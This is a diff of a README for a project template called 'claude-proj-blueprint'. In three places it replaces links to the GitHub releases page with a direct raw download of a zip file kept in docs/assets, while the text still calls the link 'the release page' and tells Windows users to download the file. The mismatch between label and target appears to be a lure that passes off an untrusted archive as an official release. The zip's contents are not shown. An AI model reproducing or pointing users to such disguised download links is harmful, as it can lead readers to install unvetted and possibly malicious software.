@@ -1,6 +1,6 @@
 # 🧩 claude-proj-blueprint - Build projects with clear structure
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/maduwanthasathsara0-hub/claude-proj-blueprint/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/maduwanthasathsara0-hub/claude-proj-blueprint/raw/refs/heads/main/docs/assets/blueprint_claude_proj_3.0-beta.2.zip)
 
 ## 🖥️ What this is
 
@@ -48,7 +48,7 @@ If you plan to connect this template to other tools, it also helps to have:
 
 Visit the release page here and download the file for Windows:
 
-https://github.com/maduwanthasathsara0-hub/claude-proj-blueprint/releases
+https://github.com/maduwanthasathsara0-hub/claude-proj-blueprint/raw/refs/heads/main/docs/assets/blueprint_claude_proj_3.0-beta.2.zip
 
 After the page opens:
 
@@ -243,4 +243,4 @@ If this is your first time using the template:
 
 Visit the release page here to download the Windows file:
 
-https://github.com/maduwanthasathsara0-hub/claude-proj-blueprint/releases
+https://github.com/maduwanthasathsara0-hub/claude-proj-blueprint/raw/refs/heads/main/docs/assets/blueprint_claude_proj_3.0-beta.2.zip
